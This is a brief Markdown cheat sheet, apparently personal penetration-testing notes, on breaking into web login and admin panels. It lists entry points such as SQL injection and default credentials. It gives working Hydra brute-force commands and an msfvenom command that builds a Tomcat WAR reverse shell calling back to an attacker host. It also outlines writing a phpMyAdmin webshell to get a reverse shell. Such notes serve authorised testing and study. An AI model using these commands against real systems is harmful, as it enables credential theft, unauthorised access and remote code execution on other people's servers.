# Exploiting Login Panels
> Tips, tricks and notes on potential entry points if an admin panel, or default login page is identified. 


### Checklist of entry points
- [ ] SQLi on username? 
- [ ] Default credentials
- [ ] credentials commented in HTML source? 
- [ ] Bruteforce
- [ ] can you register a user?
- [ ] usernames mentioned somewhere on the web app?

### Bruteforcing
- Hydra 
	- if the login is being sent via POST from a form
			- ```hydra [ip] http-post-form "/loginPage.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid" -P /usr/share/wordlists/rockyout.txt -l admin```
	- if it's sent as GET (extremely uncommon): 
		- ```hydra -l user -P /usr/share/wordlists/rockyou.txt -f [ip] http-get /targetPage```

### Common locations - login panels

### Common Exploit scenarios if acess is gained to admin panel
- tomcat
	- upload WAR file to get RCE
	- ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war```

- phpmyadmin 
	- use SQL execution to upload/write a webshell, then use webshell to get reverse shell
